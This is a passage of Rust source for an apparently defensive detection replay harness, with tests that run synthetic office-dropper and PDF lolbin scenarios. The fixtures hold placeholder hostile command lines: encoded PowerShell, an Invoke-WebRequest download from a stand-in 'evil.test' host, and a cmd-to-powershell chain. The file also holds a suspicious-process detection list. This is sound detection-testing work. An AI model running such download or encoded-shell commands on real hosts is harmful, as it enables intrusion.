            false_positive_scenario_delta: candidate_metrics.false_positive_scenarios as i64
                - baseline_metrics.false_positive_scenarios as i64,
        },
        baseline: baseline_metrics,
        candidate: candidate_metrics,
        scenario_regressions,
        technique_regressions,
    }
}

fn suite_metrics(report: &ReplaySuiteReport) -> StrategyExperimentMetrics {
    let mut adversarial_scenarios = 0usize;
    let mut benign_scenarios = 0usize;
    let mut true_positive_scenarios = 0usize;
    let mut false_negative_scenarios = 0usize;
    let mut true_negative_scenarios = 0usize;
    let mut false_positive_scenarios = 0usize;
    let mut max_detect_latency_us = 0u64;

    for scenario in &report.scenario_reports {
        max_detect_latency_us =
            max_detect_latency_us.max(scenario.evaluation.performance.detect.max_latency_us);

        if scenario_expected_positive(scenario) {
            adversarial_scenarios += 1;
            if scenario_detected(scenario) {
                true_positive_scenarios += 1;
            } else {
                false_negative_scenarios += 1;
            }
        } else if scenario_is_benign(scenario) {
            benign_scenarios += 1;
            if scenario_detected(scenario) {
                false_positive_scenarios += 1;
            } else {
                true_negative_scenarios += 1;
            }
        }
    }

    StrategyExperimentMetrics {
        total_scenarios: report.total_scenarios,
        adversarial_scenarios,
        benign_scenarios,
        true_positive_scenarios,
        false_negative_scenarios,
        true_negative_scenarios,
        false_positive_scenarios,
        detection_rate: ratio(true_positive_scenarios, adversarial_scenarios),
        false_positive_rate: ratio(false_positive_scenarios, benign_scenarios),
        max_detect_latency_us,
    }
}

fn scenario_expected_positive(report: &ReplaySuiteScenarioReport) -> bool {
    report.metadata.class == ReplayScenarioClass::Adversarial
}

fn scenario_is_benign(report: &ReplaySuiteScenarioReport) -> bool {
    report.metadata.class == ReplayScenarioClass::Benign
}

fn scenario_detected(report: &ReplaySuiteScenarioReport) -> bool {
    report.evaluation.deterministic_summary.replay_bundle_count > 0
}

fn ratio(numerator: usize, denominator: usize) -> f64 {
    if denominator == 0 {
        0.0
    } else {
        numerator as f64 / denominator as f64
    }
}

fn evaluate_experiment_gates(
    config: &ExperimentGateConfig,
    comparison: &StrategyExperimentComparison,
) -> Vec<ExperimentGateResult> {
    let mut gates = Vec::new();
    if config.require_known_bad_coverage {
        let misses = comparison
            .scenario_regressions
            .iter()
            .filter(|regression| regression.class == ReplayScenarioClass::Adversarial)
            .count();
        gates.push(ExperimentGateResult {
            name: "known_bad_coverage".to_string(),
            passed: misses == 0,
            expected: json!(0),
            actual: json!(misses),
            details: if misses == 0 {
                "candidate preserved adversarial scenario coverage".to_string()
            } else {
                "candidate missed expected adversarial detections".to_string()
            },
        });
    }

    let false_positive_delta = comparison.delta.false_positive_scenario_delta;
    gates.push(ExperimentGateResult {
        name: "false_positive_delta".to_string(),
        passed: false_positive_delta <= config.max_false_positive_delta,
        expected: json!(config.max_false_positive_delta),
        actual: json!(false_positive_delta),
        details: if false_positive_delta <= config.max_false_positive_delta {
            "candidate stayed within the configured false-positive delta".to_string()
        } else {
            "candidate exceeded the configured false-positive delta".to_string()
        },
    });

    let latency_delta = comparison.delta.max_detect_latency_delta_us;
    gates.push(ExperimentGateResult {
        name: "max_detect_latency_delta_us".to_string(),
        passed: latency_delta <= config.max_detect_latency_delta_us as i64,
        expected: json!(config.max_detect_latency_delta_us),
        actual: json!(latency_delta),
        details: if latency_delta <= config.max_detect_latency_delta_us as i64 {
            "candidate stayed within the configured detect-latency delta".to_string()
        } else {
            "candidate exceeded the configured detect-latency delta".to_string()
        },
    });

    gates
}

fn offline_correlation_config(config: &SwarmConfig) -> CorrelationConfig {
    let mut correlation = config.correlation.clone();
    correlation.enabled = true;
    if correlation.time_window_ms <= 0 {
        correlation.time_window_ms = 300_000;
    }
    if correlation.min_shared_keys == 0 {
        correlation.min_shared_keys = 1;
    }
    if correlation.candidate_limit == 0 {
        correlation.candidate_limit = 32;
    }
    correlation
}

fn sanitize_id(id: &str) -> String {
    id.chars()
        .map(|ch| {
            if ch.is_ascii_alphanumeric() || ch == '-' || ch == '_' {
                ch
            } else {
                '_'
            }
        })
        .collect()
}

fn sorted_recent_runs(bundles: &[ReplayRunBundle]) -> Vec<ReplayRunBundle> {
    let mut ordered = bundles.to_vec();
    ordered.sort_by_key(|bundle| std::cmp::Reverse(bundle.created_at_ms));
    ordered
}

fn now_ms() -> i64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_millis() as i64
}

#[derive(Debug, Clone)]
struct LoadedReplayScenario {
    path: PathBuf,
    manifest: ReplayScenarioManifest,
}

#[derive(Debug, Clone)]
struct LoadedReplaySuite {
    path: PathBuf,
    manifest: ReplaySuiteManifest,
}

#[derive(Debug, Clone)]
struct LoadedDetectorExperiment {
    path: PathBuf,
    manifest: DetectorExperimentManifest,
}

#[derive(Debug, Clone)]
struct ReplaySuiteSelection {
    source: String,
    source_kind: ReplaySuiteSourceKind,
    suite_name: Option<String>,
    suite_description: Option<String>,
    corpus_version: Option<String>,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
struct ReplayRunIndex {
    entries: Vec<ReplayRunRecord>,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
struct ExperimentIndex {
    entries: Vec<StrategyExperimentRecord>,
}

fn default_require_known_bad_coverage() -> bool {
    true
}

fn default_max_detect_latency_delta_us() -> u64 {
    2_000
}

#[cfg(test)]
mod tests {
    use super::{
        DefaultReplayHarness, DetectorExperimentManifest, ReplayEvaluationReport, ReplayRunBundle,
        ReplayScenarioClass, ReplayScenarioInput, ReplayScenarioManifest, ReplayScenarioMetadata,
        ReplayScenarioStep, ReplaySuiteManifest, render_evaluation_report,
        render_experiment_report, render_replay_run, render_suite_report,
    };
    use crate::config::parse_config;
    use serde_json::Value;
    use std::fs;
    use std::path::{Path, PathBuf};
    use std::time::{SystemTime, UNIX_EPOCH};
    use swarm_core::types::{ResponseAction, Severity};
    use swarm_whisker::{ProcessStartEvent, TelemetryEvent, TelemetryPayload};

    fn sample_config() -> swarm_core::config::SwarmConfig {
        parse_config(
            r#"
name: replay-tests
description: replay test config
runtime:
  mode: live_response
  telemetry_sources:
    - name: synthetic-process
      subject: telemetry.synthetic.process
  max_in_flight_actions: 4
  require_durable_live_response: false
detection:
  strategy: suspicious_process_tree
  high_confidence_threshold: 0.90
  medium_confidence_threshold: 0.70
pheromone:
  default_half_life_secs: 3600.0
  evaporation_threshold: 0.01
  min_sources_for_escalation: 2
  alert_threshold: 2.0
  incident_threshold: 5.0
  backend:
    kind: in_memory
policy:
  human_gate_severity: HIGH
  lease_ttl_ms: 60000
audit:
  bundle_store:
    kind: memory
  recent_decisions_limit: 20
investigation:
  enabled: false
  worker_count: 1
  max_pending_jobs: 16
  time_budget_ms: 250
  bundle_store:
    kind: memory
correlation:
  enabled: false
  time_window_ms: 300000
  min_shared_keys: 1
  candidate_limit: 32
  incident_store:
    kind: memory
"#,
            "inline",
        )
        .unwrap()
    }

    fn suspicious_event(
        event_id: &str,
        host_id: &str,
        user: &str,
        command_line: &str,
    ) -> TelemetryEvent {
        TelemetryEvent {
            source: "synthetic".to_string(),
            event_id: event_id.to_string(),
            timestamp: 1_700_000_000_000,
            host_id: Some(host_id.to_string()),
            payload: TelemetryPayload::ProcessStart(ProcessStartEvent {
                parent_process: "WINWORD".to_string(),
                process_name: "powershell".to_string(),
                command_line: command_line.to_string(),
                user: Some(user.to_string()),
            }),
        }
    }

    fn benign_event(event_id: &str) -> TelemetryEvent {
        TelemetryEvent {
            source: "synthetic".to_string(),
            event_id: event_id.to_string(),
            timestamp: 1_700_000_000_000,
            host_id: Some("host-benign".to_string()),
            payload: TelemetryPayload::ProcessStart(ProcessStartEvent {
                parent_process: "launchd".to_string(),
                process_name: "ls".to_string(),
                command_line: "ls -la".to_string(),
                user: Some("alice".to_string()),
            }),
        }
    }

    fn scenario_manifest() -> ReplayScenarioManifest {
        ReplayScenarioManifest {
            name: "office_dropper_correlation".to_string(),
            description: "Two suspicious office child processes should correlate".to_string(),
            seed_time_ms: 1_700_000_100_000,
            requested_by: "replay-whisker".to_string(),
            receipt_chain: vec!["seed-receipt".to_string()],
            metadata: ReplayScenarioMetadata {
                class: ReplayScenarioClass::Adversarial,
                campaign: Some("hellcat.office_loader".to_string()),
                techniques: vec!["T1204.002".to_string(), "T1059.001".to_string()],
                tags: vec!["office".to_string(), "correlation".to_string()],
            },
            input: ReplayScenarioInput::Events {
                events: vec![
                    ReplayScenarioStep {
                        action: ResponseAction::IsolateHost {
                            host_id: "host-ops-1".to_string(),
                        },
                        event: suspicious_event(
                            "hunt-evt-1",
                            "host-ops-1",
                            "alice",
                            "powershell.exe -enc AAA=",
                        ),
                    },
                    ReplayScenarioStep {
                        action: ResponseAction::BlockEgress {
                            target: "198.51.100.20".to_string(),
                        },
                        event: suspicious_event(
                            "hunt-evt-2",
                            "host-ops-1",
                            "alice",
                            "powershell.exe Invoke-WebRequest https://evil.test",
                        ),
                    },
                ],
            },
            expectations: serde_yaml::from_str(
                r#"
replay_bundle_count: 2
investigation_count: 2
incident_count: 1
hunts:
  - hunt_id: hunt-evt-1
    action_kind: isolate_host
    policy_verdict: require_human
    response_kind: success
  - hunt_id: hunt-evt-2
    action_kind: block_egress
    policy_verdict: require_human
    response_kind: success
incident_hunt_groups:
  - [hunt-evt-1, hunt-evt-2]
max_detect_latency_us: 5000
max_policy_latency_us: 5000
max_response_latency_us: 5000
"#,
            )
            .unwrap(),
        }
    }

    fn benign_manifest() -> ReplayScenarioManifest {
        ReplayScenarioManifest {
            name: "benign_baseline".to_string(),
            description: "Benign process tree should not emit replay bundles".to_string(),
            seed_time_ms: 1_700_000_200_000,
            requested_by: "replay-whisker".to_string(),
            receipt_chain: vec![],
            metadata: ReplayScenarioMetadata {
                class: ReplayScenarioClass::Benign,
                campaign: None,
                techniques: Vec::new(),
                tags: vec!["control".to_string()],
            },
            input: ReplayScenarioInput::Events {
                events: vec![ReplayScenarioStep {
                    action: ResponseAction::Escalate {
                        summary: "operator review".to_string(),
                        urgency: Severity::Medium,
                    },
                    event: benign_event("hunt-benign-1"),
                }],
            },
            expectations: serde_yaml::from_str(
                r#"
replay_bundle_count: 0
investigation_count: 0
incident_count: 0
max_detect_latency_us: 5000
max_policy_latency_us: 5000
max_response_latency_us: 5000
"#,
            )
            .unwrap(),
        }
    }

    fn python_benign_manifest() -> ReplayScenarioManifest {
        ReplayScenarioManifest {
            name: "python_maintenance_benign".to_string(),
            description: "Python maintenance curl should remain benign".to_string(),
            seed_time_ms: 1_700_000_400_000,
            requested_by: "replay-whisker".to_string(),
            receipt_chain: vec![],
            metadata: ReplayScenarioMetadata {
                class: ReplayScenarioClass::Benign,
                campaign: Some("operator_maintenance".to_string()),
                techniques: vec!["T1105".to_string()],
                tags: vec!["control".to_string(), "python".to_string()],
            },
            input: ReplayScenarioInput::Events {
                events: vec![ReplayScenarioStep {
                    action: ResponseAction::Escalate {
                        summary: "operator review".to_string(),
                        urgency: Severity::Medium,
                    },
                    event: TelemetryEvent {
                        source: "synthetic".to_string(),
                        event_id: "hunt-python-benign-1".to_string(),
                        timestamp: 1_700_000_000_400,
                        host_id: Some("host-python".to_string()),
                        payload: TelemetryPayload::ProcessStart(ProcessStartEvent {
                            parent_process: "python".to_string(),
                            process_name: "curl".to_string(),
                            command_line: "curl https://intranet.local/health".to_string(),
                            user: Some("svc-maintenance".to_string()),
                        }),
                    },
                }],
            },
            expectations: serde_yaml::from_str(
                r#"
replay_bundle_count: 0
investigation_count: 0
incident_count: 0
max_detect_latency_us: 5000
max_policy_latency_us: 5000
max_response_latency_us: 5000
"#,
            )
            .unwrap(),
        }
    }

    fn pdf_lolbin_manifest() -> ReplayScenarioManifest {
        ReplayScenarioManifest {
            name: "pdf_lolbin_execution".to_string(),
            description: "PDF reader spawning cmd should be suspicious".to_string(),
            seed_time_ms: 1_700_000_300_000,
            requested_by: "replay-whisker".to_string(),
            receipt_chain: vec!["seed-receipt".to_string()],
            metadata: ReplayScenarioMetadata {
                class: ReplayScenarioClass::Adversarial,
                campaign: Some("hellcat.office_loader".to_string()),
                techniques: vec![
                    "T1204.002".to_string(),
                    "T1059.003".to_string(),
                    "T1059.001".to_string(),
                ],
                tags: vec!["pdf".to_string(), "lolbin".to_string()],
            },
            input: ReplayScenarioInput::Events {
                events: vec![ReplayScenarioStep {
                    action: ResponseAction::IsolateHost {
                        host_id: "host-pdf-1".to_string(),
                    },
                    event: TelemetryEvent {
                        source: "synthetic".to_string(),
                        event_id: "hunt-pdf-1".to_string(),
                        timestamp: 1_700_000_000_300,
                        host_id: Some("host-pdf-1".to_string()),
                        payload: TelemetryPayload::ProcessStart(ProcessStartEvent {
                            parent_process: "ACRORD32".to_string(),
                            process_name: "cmd".to_string(),
                            command_line: "cmd.exe /c powershell.exe -enc BBB=".to_string(),
                            user: Some("alice".to_string()),
                        }),
                    },
                }],
            },
            expectations: serde_yaml::from_str(
                r#"
replay_bundle_count: 1
investigation_count: 1
incident_count: 1
hunts:
  - hunt_id: hunt-pdf-1
    action_kind: isolate_host
    policy_verdict: require_human
    response_kind: success
incident_hunt_groups:
  - [hunt-pdf-1]
max_detect_latency_us: 5000
max_policy_latency_us: 5000
max_response_latency_us: 5000
"#,
            )
            .unwrap(),
        }
    }

    fn unique_temp_dir(label: &str) -> PathBuf {
        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let path = std::env::temp_dir().join(format!(
            "swarm-runtime-replay-{label}-{}-{nanos}",
            std::process::id()
        ));
        fs::create_dir_all(&path).unwrap();
        path
    }

    fn write_scenario(root: &Path, name: &str, manifest: &ReplayScenarioManifest) -> PathBuf {
        let path = root.join(name);
        fs::write(&path, serde_yaml::to_string(manifest).unwrap()).unwrap();
        path
    }

    fn write_suite(root: &Path, name: &str, manifest: &ReplaySuiteManifest) -> PathBuf {
        let path = root.join(name);
        fs::write(&path, serde_yaml::to_string(manifest).unwrap()).unwrap();
        path
    }

    fn write_experiment(root: &Path, name: &str, manifest: &DetectorExperimentManifest) -> PathBuf {
        let path = root.join(name);
        fs::write(&path, serde_yaml::to_string(manifest).unwrap()).unwrap();
        path
    }

    fn replay_without_performance(bundle: &ReplayRunBundle) -> Value {
        serde_json::json!({
            "run_id": bundle.run_id,
            "scenario_name": bundle.scenario_name,
            "scenario_path": bundle.scenario_path,
            "metadata": bundle.metadata,
            "input_kind": bundle.input_kind,
            "seed_time_ms": bundle.seed_time_ms,
            "created_at_ms": bundle.created_at_ms,
            "requested_by": bundle.requested_by,
            "expectations": bundle.expectations,
            "replay_bundles": bundle.replay_bundles,
            "investigations": bundle.investigations,
            "incidents": bundle.incidents,
            "deterministic_summary": bundle.deterministic_summary,
        })
    }

    #[tokio::test]
    async fn event_scenario_runs_deterministically_and_persists_result_bundle() {
        let root = unique_temp_dir("events");
        let results_dir = root.join("results");
        let scenario_path = write_scenario(&root, "office-dropper.yaml", &scenario_manifest());
        let harness =
            DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();

        let first = harness.run_scenario_path(&scenario_path).await.unwrap();
        let second = harness.run_scenario_path(&scenario_path).await.unwrap();
        let loaded = harness
            .load_run("replay_run:office_dropper_correlation:1700000100000")
            .unwrap()
            .unwrap();

        assert_eq!(first.record.run_id, second.record.run_id);
        assert_eq!(
            replay_without_performance(&first.bundle),
            replay_without_performance(&second.bundle)
        );
        assert_eq!(loaded.record.run_id, first.record.run_id);
        assert_eq!(first.bundle.deterministic_summary.replay_bundle_count, 2);
        assert_eq!(first.bundle.deterministic_summary.investigation_count, 2);
        assert_eq!(first.bundle.deterministic_summary.incident_count, 1);
        assert!(render_replay_run(&first.bundle).contains("office_dropper_correlation"));

        let _ = fs::remove_dir_all(root);
    }

    #[tokio::test]
    async fn replay_bundle_fixtures_can_drive_offline_replay() {
        let root = unique_temp_dir("bundle-fixtures");
        let results_dir = root.join("results");
        let harness =
            DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();

        let source_scenario_path = write_scenario(&root, "source.yaml", &scenario_manifest());
        let source_run = harness
            .run_scenario_path(&source_scenario_path)
            .await
            .unwrap();
        let fixture_path = root.join("fixture-bundle.json");
        fs::write(
            &fixture_path,
            serde_json::to_string_pretty(&source_run.bundle.replay_bundles[0]).unwrap(),
        )
        .unwrap();

        let bundle_manifest = serde_yaml::from_str::<ReplayScenarioManifest>(&format!(
            r#"
name: persisted_bundle_fixture
description: Persisted replay bundles can be re-run offline
seed_time_ms: 1700000300000
requested_by: replay-whisker
input:
  kind: replay_bundles
  paths:
    - {}
expectations:
  replay_bundle_count: 1
  investigation_count: 1
  incident_count: 1
  hunts:
    - hunt_id: hunt-evt-1
      action_kind: isolate_host
      policy_verdict: require_human
      response_kind: success
  incident_hunt_groups:
    - [hunt-evt-1]
"#,
            fixture_path.display()
        ))
        .unwrap();
        let bundle_scenario_path = write_scenario(&root, "bundle-source.yaml", &bundle_manifest);

        let replay_from_bundle = harness
            .run_scenario_path(&bundle_scenario_path)
            .await
            .unwrap();
        assert_eq!(
            replay_from_bundle
                .bundle
                .deterministic_summary
                .replay_bundle_count,
            1
        );
        assert_eq!(
            replay_from_bundle
                .bundle
                .deterministic_summary
                .investigation_count,
            1
        );
        assert_eq!(
            replay_from_bundle
                .bundle
                .deterministic_summary
                .incident_count,
            1
        );

        let _ = fs::remove_dir_all(root);
    }

    #[tokio::test]
    async fn evaluation_report_passes_expected_scenario_and_flags_regressions() {
        let root = unique_temp_dir("evaluation");
        let results_dir = root.join("results");
        let harness =
            DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();

        let passing_path = write_scenario(&root, "passing.yaml", &scenario_manifest());
        let passing_report = harness.evaluate_scenario_path(&passing_path).await.unwrap();
        assert!(passing_report.passed);
        assert!(render_evaluation_report(&passing_report).contains("Status: pass"));

        let failing_path = write_scenario(&root, "failing.yaml", &benign_manifest());
        let failing_report: ReplayEvaluationReport =
            harness.evaluate_scenario_path(&failing_path).await.unwrap();
        assert!(failing_report.passed);

        let mut mismatched = scenario_manifest();
        mismatched.expectations.max_detect_latency_us = Some(0);
        let mismatched_path = write_scenario(&root, "mismatched.yaml", &mismatched);
        let regression_report = harness
            .evaluate_scenario_path(&mismatched_path)
            .await
            .unwrap();
        assert!(!regression_report.passed);
        assert!(
            regression_report
                .checks
                .iter()
                .any(|check| check.name == "max_detect_latency_us" && !check.passed)
        );

        let _ = fs::remove_dir_all(root);
    }

    #[tokio::test]
    async fn tracked_repo_scenarios_pass_expectation_gates() {
        let results_dir = unique_temp_dir("repo-scenarios");
        let config_path =
            PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../rulesets/default.yaml");
        let scenarios_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../scenarios");
        let harness = DefaultReplayHarness::from_path(&config_path, &results_dir).unwrap();

        let suite = harness
            .evaluate_scenarios_dir(&scenarios_dir)
            .await
            .unwrap();

        assert!(suite.passed);
        assert!(suite.total_scenarios >= 2);
        assert!(render_suite_report(&suite).contains("Replay Suite"));

        let _ = fs::remove_dir_all(results_dir);
    }

    #[tokio::test]
    async fn named_suite_manifest_runs_with_metadata_and_technique_groups() {
        let root = unique_temp_dir("suite-manifest");
        let results_dir = root.join("results");
        let scenarios_dir = root.join("scenarios");
        let suites_dir = root.join("scenario-suites");
        fs::create_dir_all(&scenarios_dir).unwrap();
        fs::create_dir_all(&suites_dir).unwrap();

        let office_path = write_scenario(
            &scenarios_dir,
            "office-dropper-correlation.yaml",
            &scenario_manifest(),
        );
        let pdf_path = write_scenario(
            &scenarios_dir,
            "pdf-lolbin-execution.yaml",
            &pdf_lolbin_manifest(),
        );
        let benign_path = write_scenario(
            &scenarios_dir,
            "python-maintenance-benign.yaml",
            &python_benign_manifest(),
        );

        let suite_path = write_suite(
            &suites_dir,
            "hellcat-office-v1.yaml",
            &ReplaySuiteManifest {
                name: "hellcat_office_v1".to_string(),
                description: "Hellcat office corpus".to_string(),
                corpus_version: "test-1".to_string(),
                metadata: Default::default(),
                scenarios: vec![
                    office_path.display().to_string(),
                    pdf_path.display().to_string(),
                    benign_path.display().to_string(),
                ],
            },
        );

        let harness =
            DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();
        let suite = harness.evaluate_suite_path(&suite_path).await.unwrap();

        assert!(suite.passed);
        assert_eq!(suite.total_scenarios, 3);
        assert_eq!(
            suite.source_kind,
            super::ReplaySuiteSourceKind::SuiteManifest
        );
        assert!(
            suite
                .technique_groups
                .iter()
                .any(|group| group.technique == "T1204.002")
        );
        assert!(render_suite_report(&suite).contains("hellcat_office_v1"));

        let _ = fs::remove_dir_all(root);
    }

    #[tokio::test]
    async fn experiment_report_persists_and_flags_false_positive_regression() {
        let root = unique_temp_dir("experiment");
        let results_dir = root.join("results");
        let experiments_dir = root.join("experiments-results");
        let scenarios_dir = root.join("scenarios");
        let suites_dir = root.join("scenario-suites");
        let experiments_src_dir = root.join("experiments");
        fs::create_dir_all(&scenarios_dir).unwrap();
        fs::create_dir_all(&suites_dir).unwrap();
        fs::create_dir_all(&experiments_src_dir).unwrap();

        let office_path = write_scenario(
            &scenarios_dir,
            "office-dropper-correlation.yaml",
            &scenario_manifest(),
        );
        let benign_path = write_scenario(
            &scenarios_dir,
            "python-maintenance-benign.yaml",
            &python_benign_manifest(),
        );
        let suite_path = write_suite(
            &suites_dir,
            "hellcat-office-v1.yaml",
            &ReplaySuiteManifest {
                name: "hellcat_office_v1".to_string(),
                description: "Hellcat office corpus".to_string(),
                corpus_version: "test-1".to_string(),
                metadata: Default::default(),
                scenarios: vec![
                    office_path.display().to_string(),
                    benign_path.display().to_string(),
                ],
            },
        );

        let experiment_path = write_experiment(
            &experiments_src_dir,
            "python-parent-broadening.yaml",
            &serde_yaml::from_str::<DetectorExperimentManifest>(&format!(
                r#"
name: python_parent_broadening
description: broaden suspicious parents to python
corpus:
  suite: {}
candidate:
  strategy: suspicious_process_tree
  strategy_id: python_parent_broadening
  description: add python to suspicious parents
  profile:
    suspicious_parents:
      - winword
      - excel
      - outlook
      - acrord32
      - teams
      - python
    suspicious_children:
      - powershell
      - pwsh
      - cmd
      - sh
      - bash
      - curl
      - wget
    high_confidence_threshold: 0.9
    medium_confidence_threshold: 0.7
lineage:
  parent_strategy_id: suspicious_process_tree
  mutation: broaden suspicious parent set with python
  rationale: explore downloader coverage
gates:
  require_known_bad_coverage: true
  max_false_positive_delta: 0
  max_detect_latency_delta_us: 5000
"#,
                suite_path.display()
            ))
            .unwrap(),
        );

        let harness =
            DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();
        let lookup = harness
            .evaluate_experiment_path(&experiment_path, &experiments_dir)
            .await
            .unwrap();

        assert!(!lookup.report.passed);
        assert!(
            lookup
                .report
                .comparison
                .scenario_regressions
                .iter()
                .any(|regression| regression.reason.contains("false positive"))
        );
        assert!(
            lookup
                .report
                .gates
                .iter()
                .any(|gate| gate.name == "false_positive_delta" && !gate.passed)
        );
        assert!(render_experiment_report(&lookup.report).contains("Detector Experiment"));
        let reloaded = harness
            .load_experiment(&experiments_dir, &lookup.record.experiment_id)
            .unwrap()
            .unwrap();
        assert_eq!(reloaded.record.experiment_id, lookup.record.experiment_id);

        let _ = fs::remove_dir_all(root);
    }
}
